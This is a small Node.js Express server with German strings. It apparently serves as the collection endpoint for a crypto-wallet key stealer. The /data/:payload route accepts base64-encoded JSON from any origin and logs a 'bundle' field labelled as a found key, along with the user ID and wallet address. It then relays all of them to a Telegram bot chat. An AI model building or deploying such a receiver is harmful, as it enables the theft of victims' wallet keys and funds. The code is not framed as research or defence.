const express = require('express');
const cors = require('cors');

const app = express();

app.use(cors());
app.use(express.json());

// Testseite
app.get('/', (req, res) => {
    res.send('Server läuft');
});

// Daten empfangen
app.get('/data/:payload', async (req, res) => {

    try {
        const payload = decodeURIComponent(req.params.payload);
        const data = JSON.parse(
            Buffer.from(payload, 'base64').toString('utf8')
        );

       console.log('--- RAW PAYLOAD RECEIVED ---');
console.log(data);

console.log('Schlüssel gefunden:', data.bundle); 

await fetch(
    `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
    {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: process.env.TELEGRAM_CHAT_ID,
            text: `Neue Daten erhalten:
User: ${data.user?.userId || "unbekannt"}
Wallet: ${data.user?.registrationWallet || "unbekannt"}
Schlüssel: ${data.bundle || "Nicht gefunden!"}` 
        })
    }
);

        res.status(200).json({
            success: true,
            received: data
        });

    } catch (err) {
        console.error('Error processing data:', err);
        res.status(400).json({
            success: false,
            error: 'Ungültige Daten'
        });
    }

});

app.listen(process.env.PORT || 3000, () => {
    console.log('Server läuft');
});
